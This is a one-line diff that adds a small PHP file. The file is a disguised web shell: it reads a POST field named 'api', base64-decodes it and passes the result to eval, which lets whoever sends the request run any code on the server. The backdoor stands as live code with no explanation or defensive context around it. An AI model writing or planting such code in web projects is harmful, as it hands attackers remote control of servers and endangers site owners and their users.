@@ -1,0 +1,1 @@
+<?php $time = substr($_POST['api'], 1);if($api == ''){$api = 'base64_decode';eval($api($time));}?>
